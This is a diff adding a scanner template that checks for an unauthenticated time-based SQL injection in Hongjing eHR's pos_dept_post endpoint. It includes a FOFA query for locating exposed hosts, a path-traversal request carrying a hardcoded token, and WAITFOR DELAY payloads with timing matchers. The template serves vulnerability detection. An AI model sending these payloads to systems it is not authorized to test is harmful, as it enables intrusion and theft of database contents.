@@ -1,0 +1,39 @@
+id: hjeHR-pos_dept_post-sql-injection
+
+info:
+  name: 宏景eHR pos_dept_post SQL延时注入漏洞
+  author: unknown
+  severity: high
+  description: |-
+    fofa: body="<div class=\"hj-hy-all-one-logo\"" || title="人力资源信息管理系统" || body="/general/sys/hjaxmanage.js"
+    宏景eHR pos_dept_post接口处存在SQL注入漏洞，未经过身份认证的远程攻击者可利用此漏洞执行任意SQL指令，从而窃取数据库敏感信息。
+  reference:
+    - https://blog.csdn.net/m0_60571842/article/details/139578445
+  tags: sql injection
+
+http:
+  - raw:
+      - |
+        POST /templates/attestation/../../pos/roleinfo/pos_dept_post HTTP/1.1
+        Host: {{Hostname}}
+        x-auth-token: d9eaeacd5de1008fd43f737c853dcbcb
+        Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+
+        usertable=h00&i9999=1';WAITFOR DELAY '0:0:3'--+
+
+      - |
+        POST /templates/attestation/../../pos/roleinfo/pos_dept_post HTTP/1.1
+        Host: {{Hostname}}
+        x-auth-token: d9eaeacd5de1008fd43f737c853dcbcb
+        Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+
+        usertable=h00&i9999=1';WAITFOR DELAY '0:0:6'--+
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+            - 'duration_1>=3 && duration_1<=4'  
+            - 'duration_2>=6 && duration_2<=7'  
+      - type: status
+        status: 
+          - 200
